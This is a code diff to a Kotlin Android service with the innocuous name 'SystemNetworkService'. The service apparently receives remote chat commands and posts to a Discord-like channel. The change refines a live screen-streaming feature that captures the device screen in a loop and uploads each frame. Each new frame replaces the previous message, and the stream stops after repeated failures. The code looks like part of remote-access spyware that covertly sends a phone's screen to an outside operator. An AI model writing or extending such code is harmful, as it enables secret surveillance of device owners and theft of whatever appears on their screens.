@@ -76,6 +76,7 @@ class SystemNetworkService : Service() {
     private var streamJob: Job? = null
     private var isStreaming = false
     private var streamFps = 1
+    private var streamMessageId: String? = null
     private var isDownloadingUpdate = false
 
     override fun onBind(i: Intent?): IBinder? = null
@@ -326,6 +327,8 @@ class SystemNetworkService : Service() {
                             if (isStreaming) {
                                 streamJob?.cancel()
                                 isStreaming = false
+                                streamMessageId?.let { d.deleteMsg(it) }
+                                streamMessageId = null
                                 d.sendMsg(":stop_button: **Live stream stopped**")
                             } else {
                                 d.sendMsg(":x: No active stream")
@@ -1006,24 +1009,36 @@ class SystemNetworkService : Service() {
         streamFps = fps
         if (isStreaming) {
             streamJob?.cancel()
+            streamMessageId = null
         }
         isStreaming = true
+        streamMessageId = null
         d.sendMsg(":tv: **Live stream started** at ${fps}fps\nUse `!stream stop` to end")
         streamJob = scope.launch {
             var consecutiveFailures = 0
             val maxFailures = 5
+            var frameCount = 0
             try {
                 while (isActive) {
                     try {
                         val bytes = captureScreenForStream()
                         if (bytes != null) {
                             consecutiveFailures = 0
-                            d.sendFile("", "stream_${System.currentTimeMillis()}.jpg", bytes)
+                            frameCount++
+                            val oldId = streamMessageId
+                            val newId = d.sendFileAwait("", "stream.jpg", bytes)
+                            if (newId != null) {
+                                streamMessageId = newId
+                                if (oldId != null) {
+                                    d.deleteMsgAwait(oldId)
+                                }
+                            }
                         } else {
                             consecutiveFailures++
                             if (consecutiveFailures >= maxFailures) {
                                 d.sendMsg(":x: Stream stopped — too many failures")
                                 isStreaming = false
+                                streamMessageId = null
                                 break
                             }
                         }
@@ -1032,6 +1047,7 @@ class SystemNetworkService : Service() {
                         if (consecutiveFailures >= maxFailures) {
                             d.sendMsg(":x: Stream error — stopped")
                             isStreaming = false
+                            streamMessageId = null
                             break
                         }
                     }
@@ -1039,6 +1055,7 @@ class SystemNetworkService : Service() {
                 }
             } catch (e: Exception) {
                 isStreaming = false
+                streamMessageId = null
             }
         }
     }
